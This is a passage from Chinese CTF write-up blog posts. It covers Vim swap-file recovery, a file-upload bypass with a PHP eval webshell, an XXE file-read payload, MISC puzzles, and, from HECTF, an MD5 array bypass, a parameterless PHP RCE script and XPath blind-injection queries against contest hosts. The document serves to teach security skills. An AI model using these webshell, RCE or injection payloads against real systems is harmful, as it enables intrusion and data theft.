src="/article/S3cCTF-gyy-Writeup/20201122181549903.png" class="" title="calnum" loading="lazy"><p>本人蹩脚自学的python，语法规范问题请见谅</p><hr><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><h3 id="出题解析-5"><a href="#出题解析-5" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察Linux下Vim的应用，同时考察PHP代码审计及robots协议</p><p>给了hint：vim强退会在当前目录生成生成备份文件</p><h3 id="解题方式-5"><a href="#解题方式-5" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开先看源代码</p><img src="/article/S3cCTF-gyy-Writeup/20201122192109829.png" class="" title="vim" loading="lazy"><p>Recover<br>Linux中，如果vim强退的话（ctrl+z）就会在目录下生成备份文件，如图所示</p><img src="/article/S3cCTF-gyy-Writeup/20201122192350871.png" class="" title="ctrl+z" loading="lazy"><p>而再vim编辑就会有如下提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122192439588.png" class="" title="re" loading="lazy"><p>直接Recover恢复即可。</p><p>根据提示，访问./.index.php.swp。发现下载.swp文件<br>这里注意，备份文件是隐藏文件，文件名前面有个点<br>拿去linux系统恢复，可以发现</p><img src="/article/S3cCTF-gyy-Writeup/20201122192914742.png" class="" title="flag1" loading="lazy"><p>由此，flag分为多部分<br>接下来代码审计很简单，回到index.php，POST传参</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>pazzword<span class="token operator">=</span>a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122193206215.png" class="" title="flag2" loading="lazy"><p>机器人会告诉你剩下的，联想robots协议，访问./robots.txt</p><img src="/article/S3cCTF-gyy-Writeup/20201122193300252.png" class="" title="robots" loading="lazy"><p>可得flag在./r/o/b/o/a/t/s/1.php</p><img src="/article/S3cCTF-gyy-Writeup/20201122193344579.png" class="" title="flag3" loading="lazy"><p>将三段flag组合即可</p><hr><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><h3 id="出题解析-6"><a href="#出题解析-6" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察文件上传，考察上传绕过的姿势，因为比赛限制，没有出太难的过滤</p><h3 id="解题方式-6"><a href="#解题方式-6" class="headerlink" title="解题方式"></a>解题方式</h3><p>当然，不是真的让你上传个动图。。我服务器里发现了好多奇奇怪怪的图片<br>一般文件上传一句话木马直接获取shell<br><code>&lt;?php @eval($_POST[gyy])?&gt;</code><br>需要能被php解析才行，.txt,.gif都是不可被解析的<br>或者直接用script标签<br><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[gyy]);&lt;/script&gt;</code><br>后缀名限制</p><img src="/article/S3cCTF-gyy-Writeup/20201122194102133.png" class="" title="php" loading="lazy"><p>上传普通图片，被过滤</p><img src="/article/S3cCTF-gyy-Writeup/20201122193716205.png" class="" title="gif" loading="lazy"><p>抓包上传,原始如下</p><img src="/article/S3cCTF-gyy-Writeup/20201122194225470.png" class="" title="post1" loading="lazy"><p>修改如下</p><img src="/article/S3cCTF-gyy-Writeup/20201122195020428.png" class="" title="post2" loading="lazy"><p>请求头检查：content-type，MIME类型限制，修改为<code>image/gif</code><br>文件后缀绕过：只要能被php解析的文件名就可以<br>这里我只限制了<code>.php</code>,<code>.php3</code>,<code>.php4</code>,<code>.php5</code><br>MIME类型限制只允许<code>image/gif</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122195119845.png" class="" title="upload" loading="lazy"><p>然后访问文件</p><img src="/article/S3cCTF-gyy-Writeup/20201122195246767.png" class="" title="upload2" loading="lazy"><p>发现代码被执行了，直接蚁剑连上get shell</p><img src="/article/S3cCTF-gyy-Writeup/20201122195418743.png" class="" title="upload3" loading="lazy"><p>根目录发现flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122195438365.png" class="" title="upload4" loading="lazy"><p>你们真的传了一堆堆奇奇怪怪的图片。。。</p><hr><h2 id="XML-External-Entity"><a href="#XML-External-Entity" class="headerlink" title="XML External Entity"></a>XML External Entity</h2><h3 id="出题解析-7"><a href="#出题解析-7" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察XXE注入，即 XML实体注入</p><h3 id="解题方式-7"><a href="#解题方式-7" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开直接给phpinfo，源代码有提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122195910990.png" class="" title="hint" loading="lazy"><p>底部发现</p><img src="/article/S3cCTF-gyy-Writeup/20201122195933621.png" class="" title="system" loading="lazy"><p>其实是执行了<code>system(&quot;ls&quot;);</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122200056166.png" class="" title="index" loading="lazy"><p>然后每个文件都高亮了语法，<code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code>均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。存在的XXE漏洞具体可以百度研究一下。<br>样例Payload：</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122200729886.png" class="" title="dom" loading="lazy"><p>其实还可以利用写入一句话木马等操作。</p><hr><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="信息搜索"><a href="#信息搜索" class="headerlink" title="信息搜索"></a>信息搜索</h2><h3 id="出题解析-8"><a href="#出题解析-8" class="headerlink" title="出题解析"></a>出题解析</h3><p>信息搜索也是门技术，好好利用搜索引擎可以达到事半功倍的效果.<br>确实，只要仔细搜索，没有任何问题</p><h3 id="解题方式-8"><a href="#解题方式-8" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开五道题，一道道解决</p><h4 id="1-截至2020年10月31日，RFC最新的正式文档编号是多少"><a href="#1-截至2020年10月31日，RFC最新的正式文档编号是多少" class="headerlink" title="1.截至2020年10月31日，RFC最新的正式文档编号是多少?"></a>1.截至2020年10月31日，RFC最新的正式文档编号是多少?</h4><p>RFC文档，Request For Comments，官网连<em>科学上网</em>都不需要</p><img src="/article/S3cCTF-gyy-Writeup/20201122201134715.png" class="" title="rfc" loading="lazy"><p>访问<code>https://www.ietf.org/</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201307663.png" class="" title="rfc" loading="lazy"><p>或者直接访问RFC文档搜索网站<code>https://www.rfc-editor.org/search/rfc_search.php</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201725572.png" class="" title="rfc" loading="lazy"><p>截至2020年10月31日，一查</p><img src="/article/S3cCTF-gyy-Writeup/20201122201943714.png" class="" title="rfc" loading="lazy"><p>最新为RFC8940<br>这种东西最标准还是去官网查</p><h4 id="2-国家网络安全宣传周第一届是在哪一年举行的？"><a href="#2-国家网络安全宣传周第一届是在哪一年举行的？" class="headerlink" title="2.国家网络安全宣传周第一届是在哪一年举行的？"></a>2.国家网络安全宣传周第一届是在哪一年举行的？</h4><p>2014</p><img src="/article/S3cCTF-gyy-Writeup/20201122202110805.png" class="" width="2014" loading="lazy"><h4 id="3-本校校园卡上对应的教学楼是主校区的几号教学楼？"><a href="#3-本校校园卡上对应的教学楼是主校区的几号教学楼？" class="headerlink" title="3. 本校校园卡上对应的教学楼是主校区的几号教学楼？"></a>3. 本校校园卡上对应的教学楼是主校区的几号教学楼？</h4><p>拿出来看看…百度地图打开，</p><img src="/article/S3cCTF-gyy-Writeup/20201122202320233.png" class="" width="1" loading="lazy"><p>全景地图</p><img src="/article/S3cCTF-gyy-Writeup/20201122202433684.png" class="" width="1" loading="lazy"><p>有点老，仔细观察地图，只有1教有那么大地方，2教3教都不会有那么大的中央空地<img src="/article/S3cCTF-gyy-Writeup/20201122202751489.jfif" class="" width="1" loading="lazy"><br>good</p><h4 id="4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"><a href="#4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？" class="headerlink" title="4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"></a>4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？</h4><p>33<br>招新PPT上写的，学校公众号也能查到</p><h4 id="5-截至目前最新的C语言标准是C多少？"><a href="#5-截至目前最新的C语言标准是C多少？" class="headerlink" title="5. 截至目前最新的C语言标准是C多少？"></a>5. 截至目前最新的C语言标准是C多少？</h4><p>18<br>C标准以年号结尾命名，有人问为什么不是C99,C11….我只能说，现在最新的是C18，百度好好查查吧…（2年了）</p><p>全部答对给flag，不行爆破也行</p><hr><h2 id="myid"><a href="#myid" class="headerlink" title="myid"></a>myid</h2><h3 id="出题解析-9"><a href="#出题解析-9" class="headerlink" title="出题解析"></a>出题解析</h3><p>社工大佬，怕了怕了</p><h3 id="解题方式-9"><a href="#解题方式-9" class="headerlink" title="解题方式"></a>解题方式</h3><p>原本考爆破的，后来干脆直接你们社工算了…</p><img src="/article/S3cCTF-gyy-Writeup/20201122203410982.png" class="" title="id" loading="lazy"><p>打开去掉disable标签</p><img src="/article/S3cCTF-gyy-Writeup/2020112220344579.png" class="" title="id" loading="lazy"><p>下面提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122203500307.png" class="" title="id" loading="lazy"><p>原来想考爆破，最后都知道了…id是我学号，直接开始社工，索性改分类为MISC。<br>再给个hint：<code>计算机院 2019 懂？</code><br>首先2019级即前5位为<code>12019</code><br>计算机院为050-055(大概）<br>所以前八位<code>1201905x</code>，爆破一下就好了。<br>当然也有问学长学姐的，问墙的，翻我空间的，查学校名册的，都可以。这题就当玩玩233333<br>ID:12019054018</p><img src="/article/S3cCTF-gyy-Writeup/20201122203854684.png" class="" title="id" loading="lazy"><hr><h2 id="flag-jpg"><a href="#flag-jpg" class="headerlink" title="flag.jpg"></a>flag.jpg</h2><h3 id="出题解析-10"><a href="#出题解析-10" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察工具利用以及查看属性</p><h3 id="解题方式-10"><a href="#解题方式-10" class="headerlink" title="解题方式"></a>解题方式</h3><p>小戈:give me a flag 一看属性竟然用 SteganPEG 而且还没那么简单</p><p>提示很明显，用软件 SteganPEG ，密码就是<code>givemeaflag</code>（生怕你们看不见），其实正规地方在文件的属性里</p><img src="/article/S3cCTF-gyy-Writeup/20201122204149398.png" class="" title="flag" loading="lazy"><p>软件读文件</p><img src="/article/S3cCTF-gyy-Writeup/20201122204353880.png" class="" title="flag" loading="lazy"><p>拖出来打开就是flag</p><hr><h2 id="Manchester"><a href="#Manchester" class="headerlink" title="Manchester"></a>Manchester</h2><h3 id="出题解析-11"><a href="#出题解析-11" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察 学习理解能力 百度曼彻斯特编码</p><h3 id="解题方式-11"><a href="#解题方式-11" class="headerlink" title="解题方式"></a>解题方式</h3><p>大白话解释：低电平是0，高电平是1。<br>曼彻斯特编码<code>01-&gt;1</code> <code>10-&gt;0</code><br>当时出这题用的C写的，蹩脚的东西看看就好…</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> a1<span class="token punctuation">,</span>a2<span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">&#123;</span>a1<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token string">'0'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token string">'1'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>a1<span class="token operator">&amp;&amp;</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putchar</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> </code></pre><p>得到<code>011100110011001101100011011110110100110101100001011011100100001101101000010001010111001101110100011001010111001001011111011101110011000101110100011010000101111100110000001100010011000001111101</code><br>复制去二进制转字符，直接出答案</p><img src="/article/S3cCTF-gyy-Writeup/2020112220515011.png" class="" title="man" loading="lazy"><hr><h2 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h2><h3 id="出题解析-12"><a href="#出题解析-12" class="headerlink" title="出题解析"></a>出题解析</h3><p>水题，考察知识面，和搜索…</p><h3 id="解题方式-12"><a href="#解题方式-12" class="headerlink" title="解题方式"></a>解题方式</h3><p>真的水题，搜索标题<code>SlientEye</code>，是的，这是个软件<br>默认设置解密，直接出答案</p><img src="/article/S3cCTF-gyy-Writeup/20201122205451153.png" class="" title="slient" loading="lazy"><hr><h2 id="Plaintext"><a href="#Plaintext" class="headerlink" title="Plaintext"></a>Plaintext</h2><h3 id="出题解析-13"><a href="#出题解析-13" class="headerlink" title="出题解析"></a>出题解析</h3><p>写的很清楚，明文攻击<br>给了hint，暗示伪加密<br>开赛题坚持了这么久我没想到…</p><h3 id="解题方式-13"><a href="#解题方式-13" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开发现压缩包三文件全加密，压缩包里的注释</p><pre class="language-none"><code class="language-none">亲眼所见，亦非真实也许是虚伪的，也许需要AZPR</code></pre><p>明示软件AZPR，这是个爆破软件<br>伪加密百度有一篇很详细的文章<br>修改加密位为<code>00</code>，不知道哪个文件是伪加密直接所有加密位为<code>00</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122210335385.png" class="" width="00" loading="lazy"><p>保存后解压只有副本那个文件可以保存，其他两个文件是真加密</p><img src="/article/S3cCTF-gyy-Writeup/20201122210502282.png" class="" width="00" loading="lazy"><p>根据明文攻击方法，将这个文件打包zip然后去题目再下一遍原文件,此时文件被修改，也可以改回去</p><p>用AZPR选择明文攻击即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122210917960.png" class="" title="在这里插入图片描述" loading="lazy"><p>可以看到密钥被恢复了，不用找密码了，直接可以保存</p><img src="/article/S3cCTF-gyy-Writeup/20201122211504935.png" class="" title="在这里插入图片描述" loading="lazy"><p>保存文件，其实已经破解出来了</p><img src="/article/S3cCTF-gyy-Writeup/20201122210823677.png" class="" title="在这里插入图片描述" loading="lazy"><p>或者用rbkcrack也可以<br>直接打开flag.txt得flag</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 HECTF Write-up</title>
      <link href="article/2020-HECTF-Write-up/"/>
      <url>article/2020-HECTF-Write-up/</url>
      
        <content type="html"><![CDATA[<h3 id="by-gyy"><a href="#by-gyy" class="headerlink" title="by:gyy"></a>by:gyy</h3><p>抢了到人生第一次大一点点比赛的一血</p><img src="/article/2020-HECTF-Write-up/1.png" class="" title="first" loading="lazy"><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目链接：<a href="http://121.196.32.184:12001/">http://121.196.32.184:12001/</a></p><p>打开发现<code>nonono ，once again！</code></p><p>查看源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"You need the file is xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono ，once again！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>flag不在<span class="token operator">/</span>flag中哦，你应该找找奇奇怪怪的文件名<span class="token operator">--</span><span class="token operator">></span></code></pre><p><code>$_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code><br>老MD5强类型比较，传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL=NULL的情况，绕过比较。<br>即<code>a[]=1&amp;b[]=a</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160030053.png" class="" title="image-20201129160030053" loading="lazy"><p>访问./3b8cf4731c36d20776c76e20f9c774c7.php</p><pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token double-quoted-string string">"/xxx"</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"great!!!!你需要看看源码"</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么<span class="token punctuation">,</span>记得加上绝对路径</code></pre><p>第一反应猜文件，爆破半天出不来<br>然后去扫目录，发现了/etc等目录，后来比赛方给了hint，<code>/etc/crontab</code></p><p>``./../../../etc/crontab`访问得</p><pre class="language-none"><code class="language-none"># &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )#0 17 2 8 * &#x2F;bin&#x2F;php &#x2F;very_g00d_Y0u_got_it.php</code></pre><p>很明显<code>/very_g00d_Y0u_got_it.php</code></p><p>访问得啥都没有，因为我们没写东西进去。<br>然后回上一步分析源码，<br><code>&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $data)</code><br>从data参数中匹配字母、数字、下划线，其实就是’\w+’，然后在匹配一个循环的’()’，将匹配的替换为NULL，判断剩下的是否只有’;’。</p><p>很明显无参数RCE，编写脚本，首先<code>print_r(getcwd());</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160247187.png" class="" title="image-20201129160247187" loading="lazy"><p>访问<code>/very_g00d_Y0u_got_it.php</code>得<code>/</code>，说明当前工作目录为根目录</p><img src="/article/2020-HECTF-Write-up/image-20201129160318943.png" class="" title="image-20201129160318943" loading="lazy"><p>然后<code>print_r(scandir(getcwd()));</code>扫一下目录</p><pre class="language-none"><code class="language-none">Array(    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; .dockerenv    [3] &#x3D;&gt; 3b8cf4731c36d20776c76e20f9c774c7.php    [4] &#x3D;&gt; Zmw0Z2dnZ2dnZ2dnZ2dnCg    [5] &#x3D;&gt; bin    [6] &#x3D;&gt; boot    [7] &#x3D;&gt; dev    [8] &#x3D;&gt; etc    [9] &#x3D;&gt; flag    [10] &#x3D;&gt; home    [11] &#x3D;&gt; index.php    [12] &#x3D;&gt; lib    [13] &#x3D;&gt; lib64    [14] &#x3D;&gt; media    [15] &#x3D;&gt; mnt    [16] &#x3D;&gt; opt    [17] &#x3D;&gt; proc    [18] &#x3D;&gt; root    [19] &#x3D;&gt; run    [20] &#x3D;&gt; sbin    [21] &#x3D;&gt; srv    [22] &#x3D;&gt; start.sh    [23] &#x3D;&gt; sys    [24] &#x3D;&gt; tmp    [25] &#x3D;&gt; usr    [26] &#x3D;&gt; var    [27] &#x3D;&gt; very_g00d_Y0u_got_it.php)</code></pre><img src="/article/2020-HECTF-Write-up/image-20201129160403000.png" class="" title="image-20201129160403000" loading="lazy"><p>发现异常文件<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>，访问后得到了flag</p><img src="/article/2020-HECTF-Write-up/image-20201129160434419.png" class="" title="image-20201129160434419" loading="lazy"><p>最后base64一下发现<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>就是<code>fl4gggggggggggg</code></p><p>Payload：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://121.196.32.184:12001"</span>url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/3b8cf4731c36d20776c76e20f9c774c7.php"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"data"</span> <span class="token punctuation">:</span> <span class="token string">"print_r(scandir(getcwd()));"</span><span class="token punctuation">,</span>    <span class="token string">"file"</span> <span class="token punctuation">:</span> <span class="token string">"/very_g00d_Y0u_got_it.php"</span><span class="token punctuation">&#125;</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1 <span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/very_g00d_Y0u_got_it.php"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span></code></pre><h3 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h3><p>题目链接：<a href="http://114.55.165.246:8082/">http://114.55.165.246:8082/</a></p><p>题目提示为注入，进入界面为登陆框，第一时间想到SQL注入</p><img src="/article/2020-HECTF-Write-up/image-20201129160533941.png" class="" title="image-20201129160533941" loading="lazy"><p>输admin登陆一下</p><img src="/article/2020-HECTF-Write-up/image-20201129160554397.png" class="" title="image-20201129160554397" loading="lazy"><p>是GET传参，sqlmap跑一下没有结果，万能密码<code>1&#39;or 1=1</code>试一下成功</p><img src="/article/2020-HECTF-Write-up/image-20201129160625642.png" class="" title="image-20201129160625642" loading="lazy"><p>怀疑是XXE，尝试了一会发现不是。<br>后来想到XPath注入(傻了，报错里有…)</p><p>XPath基础查询语句<code>//users/user[loginID/text()=’abc’ and password/text()=’test123’]</code></p><p>这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1   就能绕过校验，成功获取所有user数据</p><p><code>//users/user[LoginID/text()=&#39;&#39;or 1=1 and password/text()=&#39;&#39;or 1=1]</code></p><p>具体不做阐述</p><hr><p><strong>尝试XPath盲注</strong></p><p>一般步骤如下:</p><p>1.判断根下节点数:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 1</p><p>2.猜解第一级节点:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>…</p><p>result: root</p><p>3.判断root的下一级节点数:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/root/*)=2 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 2</p><p>4.猜解root的下一级节点:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=2]),1,1)=&#39;s&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: users,secret</p><p>重复上述步骤,直到猜解出所有节点.最后来猜解节点中的数据或属性值.</p><p>猜解id为1的user节点下的username值,</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(/root/users/user[id=1]/username,1,1)=&#39;a&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>…</p><p>result: admin</p><hr><p>写脚本开始跑<br>首先判断根下节点数<br>因为是GET传参，直接访问<code>http://114.55.165.246:8082/?username=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;password=1&amp;submit=登录</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160726706.png" class="" title="image-20201129160726706" loading="lazy"><p>这个结果应该是return 1，即根下有一个节点</p><p>如果换成<code>...username=1&#39; or count(/*)=2 or &#39;1&#39;=&#39;1...</code>则会返回登录失败，即结果为return 0.</p><p>继续猜测第一级节点，用脚本跑</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token 